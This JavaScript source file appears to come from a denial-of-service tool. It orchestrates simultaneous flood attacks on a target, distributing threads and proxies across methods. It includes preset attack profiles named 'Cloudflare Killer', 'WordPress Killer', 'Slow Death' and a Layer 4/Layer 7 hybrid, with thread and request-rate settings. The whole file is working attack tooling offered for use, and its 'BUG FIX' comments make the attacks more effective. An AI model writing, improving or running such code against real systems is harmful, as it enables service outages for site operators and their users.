import { AttackManager } from './attack-manager.js';
import { logger } from '../utils/logger.js';
import { REQUESTS_SENT, BYTES_SENT } from '../utils/counter.js';

/**
 * Combo Attack Manager
 * Launch multiple attack methods simultaneously for maximum impact
 */
export class ComboAttackManager {
    constructor(options) {
        this.target = options.target;
        this.methods = options.methods || []; // Array of methods to use
        this.threads = options.threads || 100;
        this.duration = options.duration || 60;
        this.rpc = options.rpc || 1;
        this.proxies = options.proxies || null;
        this.userAgents = options.userAgents || [];
        this.referers = options.referers || [];
        
        this.attackManagers = [];
        this.active = false;
        this.startTime = null;
        this.statsInterval = null;
    }

    /**
     * Start combo attack with multiple methods
     */
    async start() {
        try {
            this.active = true;
            this.startTime = Date.now();

            logger.info('🔥 Starting COMBO ATTACK!');
            logger.info(`🎯 Target: ${this.target}`);
            logger.info(`⚡ Methods: ${this.methods.join(', ')}`);
            
            // BUG FIX: Better thread allocation - distribute remaining threads
            const baseThreads = Math.floor(this.threads / this.methods.length);
            const remainingThreads = this.threads % this.methods.length;
            
            logger.info(`🧵 Base threads per method: ${baseThreads}`);
            if (remainingThreads > 0) {
                logger.info(`🧵 Extra threads distributed: ${remainingThreads}`);
            }
            logger.info(`⏱️  Duration: ${this.duration}s`);

            // Reset counters
            REQUESTS_SENT.reset();
            BYTES_SENT.reset();

            // BUG FIX: Distribute proxies evenly across methods
            const proxiesPerMethod = this.proxies && this.proxies.length > 0 
                ? Math.floor(this.proxies.length / this.methods.length)
                : 0;

            if (this.proxies && this.proxies.length > 0) {
                logger.info(`🔄 Proxies per method: ${proxiesPerMethod}`);
            }

            // Create attack manager for each method
            for (let i = 0; i < this.methods.length; i++) {
                const method = this.methods[i];
                try {
                    // BUG FIX: Distribute remaining threads to first methods
                    const methodThreads = baseThreads + (i < remainingThreads ? 1 : 0);
                    
                    // BUG FIX: Distribute proxies evenly
                    const methodProxies = this.proxies && this.proxies.length > 0
                        ? this.proxies.slice(i * proxiesPerMethod, (i + 1) * proxiesPerMethod)
                        : null;

                    const attackManager = new AttackManager({
                        target: this.target,
                        method: method,
                        threads: methodThreads,
                        duration: this.duration,
                        rpc: this.rpc,
                        proxies: methodProxies,
                        userAgents: this.userAgents,
                        referers: this.referers,
                        enableMonitoring: false // BUG FIX: Disable monitoring for combo to reduce overhead
                    });

                    this.attackManagers.push(attackManager);
                    
                    // Start attack (non-blocking)
                    attackManager.start().catch(err => {
                        logger.error(`Method ${method} error: ${err.message}`);
                    });

                    logger.success(`✅ Launched ${method} with ${methodThreads} threads${methodProxies ? ` and ${methodProxies.length} proxies` : ''}`);
                } catch (err) {
                    logger.error(`Failed to start ${method}: ${err.message}`);
                }
            }

            // Start stats monitoring
            this.startStatsMonitoring();

            // BUG FIX: Add auto-stop for combo attack (centralized)
            this.autoStopTimeout = setTimeout(() => {
                try {
                    this.stop();
                } catch (err) {
                    logger.error(`Error in combo auto-stop: ${err.message}`);
                }
            }, this.duration * 1000);

            logger.success(`🚀 COMBO ATTACK LAUNCHED with ${this.methods.length} methods!`);

        } catch (err) {
            logger.error(`Failed to start combo attack: ${err.message}`);
            this.active = false;
            throw err;
        }
    }

    /**
     * Start statistics monitoring
     */
    startStatsMonitoring() {
        this.statsInterval = setInterval(() => {
            try {
                const elapsed = Math.floor((Date.now() - this.startTime) / 1000);
                const progress = Math.floor((elapsed / this.duration) * 100);

                const activeAttacks = this.attackManagers.filter(am => am.isActive()).length;

                logger.info(
                    `🔥 COMBO Progress: ${progress}% | ` +
                    `Active: ${activeAttacks}/${this.methods.length} | ` +
                    `Requests: ${this.formatNumber(REQUESTS_SENT.get())} | ` +
                    `Data: ${this.formatBytes(BYTES_SENT.get())} | ` +
                    `Time: ${elapsed}s / ${this.duration}s`
                );
            } catch (err) {
                logger.debug(`Stats monitoring error: ${err.message}`);
            }
        }, 2000);
    }

    /**
     * Stop all attacks
     */
    stop() {
        try {
            if (!this.active) return;

            this.active = false;
            logger.info('🛑 Stopping COMBO ATTACK...');

            // BUG FIX: Clear auto-stop timeout
            if (this.autoStopTimeout) {
                try {
                    clearTimeout(this.autoStopTimeout);
                } catch (err) {
                    logger.debug(`Error clearing auto-stop timeout: ${err.message}`);
                }
                this.autoStopTimeout = null;
            }

            // Stop all attack managers
            this.attackManagers.forEach((manager, index) => {
                try {
                    if (manager && manager.isActive()) {
                        manager.stop();
                        logger.debug(`Stopped attack ${index + 1}`);
                    }
                } catch (err) {
                    logger.debug(`Error stopping attack ${index + 1}: ${err.message}`);
                }
            });

            // Clear stats interval
            if (this.statsInterval) {
                try {
                    clearInterval(this.statsInterval);
                } catch (err) {
                    logger.debug(`Error clearing interval: ${err.message}`);
                }
                this.statsInterval = null;
            }

            // BUG FIX: Force garbage collection if available
            if (global.gc) {
                try {
                    global.gc();
                    logger.debug('Garbage collection triggered');
                } catch (e) {
                    logger.debug('GC not available');
                }
            }

            logger.success('✅ COMBO ATTACK stopped!');
            logger.info(`📊 Final Stats - Requests: ${this.formatNumber(REQUESTS_SENT.get())} | Data: ${this.formatBytes(BYTES_SENT.get())}`);

        } catch (err) {
            logger.error(`Error stopping combo attack: ${err.message}`);
            // Force cleanup
            this.active = false;
            this.attackManagers = [];
            if (this.statsInterval) {
                clearInterval(this.statsInterval);
                this.statsInterval = null;
            }
            if (this.autoStopTimeout) {
                clearTimeout(this.autoStopTimeout);
                this.autoStopTimeout = null;
            }
        }
    }

    /**
     * Check if combo attack is active
     */
    isActive() {
        return this.active && this.attackManagers.some(am => am.isActive());
    }

    /**
     * Get current statistics
     */
    getStats() {
        const elapsed = this.startTime 
            ? Math.floor((Date.now() - this.startTime) / 1000)
            : 0;

        const activeAttacks = this.attackManagers.filter(am => am.isActive()).length;

        return {
            target: this.target,
            methods: this.methods,
            activeAttacks: activeAttacks,
            totalAttacks: this.methods.length,
            duration: this.duration,
            elapsed: elapsed,
            requestsSent: this.formatNumber(REQUESTS_SENT.get()),
            bytesSent: this.formatBytes(BYTES_SENT.get())
        };
    }

    /**
     * Format number to human readable
     */
    formatNumber(num) {
        const suffixes = ['', 'k', 'm', 'g', 't'];
        if (num < 1000) return num.toString();
        const exp = Math.floor(Math.log(num) / Math.log(1000));
        return `${(num / Math.pow(1000, exp)).toFixed(2)}${suffixes[exp]}`;
    }

    /**
     * Format bytes to human readable
     */
    formatBytes(bytes) {
        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
        if (bytes === 0) return '0 B';
        const i = Math.floor(Math.log(bytes) / Math.log(1024));
        return `${(bytes / Math.pow(1024, i)).toFixed(2)} ${sizes[i]}`;
    }
}

/**
 * Predefined combo attack profiles
 */
export const COMBO_PROFILES = {
    // Maximum power - all Layer 7 methods
    'MAXIMUM_POWER': {
        name: 'Maximum Power',
        description: 'All Layer 7 methods simultaneously',
        methods: ['GET', 'POST', 'HTTP2', 'STRESS', 'NULL', 'DYN'],
        threads: 600,
        rpc: 10
    },

    // Cloudflare killer
    'CLOUDFLARE_KILLER': {
        name: 'Cloudflare Killer',
        description: 'Specialized Cloudflare bypass combo',
        methods: ['CFB', 'BYPASS', 'HTTP2-CF', 'STRESS'],
        threads: 400,
        rpc: 5
    },

    // Layer 4 + Layer 7 hybrid
    'HYBRID_ATTACK': {
        name: 'Hybrid Attack',
        description: 'Layer 4 and Layer 7 combined',
        methods: ['UDP', 'TCP', 'GET', 'POST', 'HTTP2'],
        threads: 500,
        rpc: 5
    },

    // WordPress destroyer
    'WORDPRESS_KILLER': {
        name: 'WordPress Killer',
        description: 'Optimized for WordPress sites',
        methods: ['XMLRPC', 'POST', 'STRESS', 'SLOW'],
        threads: 300,
        rpc: 10
    },

    // Slow attack combo
    'SLOW_DEATH': {
        name: 'Slow Death',
        description: 'Multiple slow attacks to exhaust resources',
        methods: ['SLOW', 'APACHE', 'NULL'],
        threads: 200,
        rpc: 1
    },

    // Fast and furious
    'FAST_FURIOUS': {
        name: 'Fast & Furious',
        description: 'High-speed flood attacks',
        methods: ['GET', 'POST', 'HTTP2', 'HTTP2-POST'],
        threads: 500,
        rpc: 20
    }
};
